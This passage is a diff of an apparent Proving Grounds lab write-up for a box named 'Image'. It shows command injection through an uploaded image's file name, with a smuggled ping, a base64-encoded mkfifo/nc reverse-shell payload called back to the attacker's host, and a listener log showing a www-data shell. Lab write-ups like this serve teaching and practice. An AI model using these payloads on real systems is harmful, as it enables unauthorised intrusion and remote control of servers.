@@ -39,6 +39,47 @@ searching for exploit on this service, we can see there's an RCE vuln present re
 ┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Image]
 └─$ cp 1.png '|1"`ping 192.168.45.212`".png'
 ```
-modify the name of an image and inject an arbitary code to it. 
+modify the name of an image and inject an arbitary code to ping our host. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/4e80705f-9c83-4cf9-a4b5-3f8480c9655b)
+
+upload the modified image. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/baa494d9-ee75-475a-aedb-f14c4c0225af)
+
+we got a ping back, let's spawn a reverse shell.
+
+```shell
+#base64 encode payload
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.212 80 >/tmp/f
+
+cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguNDUuMjEyIDgwID4vdG1wL2Y=
+
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Image]
+└─$ cp 1.png '|1"`echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguNDUuMjEyIDgwID4vdG1wL2Y= | base64 -d|bash`".png'
+```
+first we base64 encode the reverse shell payload. fire up ncat listener
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/039154d6-b9ab-4e95-ad25-a1dd907e9ceb)
+
+Uploaded the image.
+
+
+```shell
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Image]
+└─$ ncat -lnvp 80                                                
+Ncat: Version 7.94SVN ( https://nmap.org/ncat )
+Ncat: Listening on [::]:80
+Ncat: Listening on 0.0.0.0:80
+Ncat: Connection from 192.168.239.178:55626.
+sh: 0: can't access tty; job control turned off
+$ whoami 
+www-data
+$
+```
+check back listener and we got a reverse shell as `www-data`. 
+
+
+## Privilege Escalation 
 
 
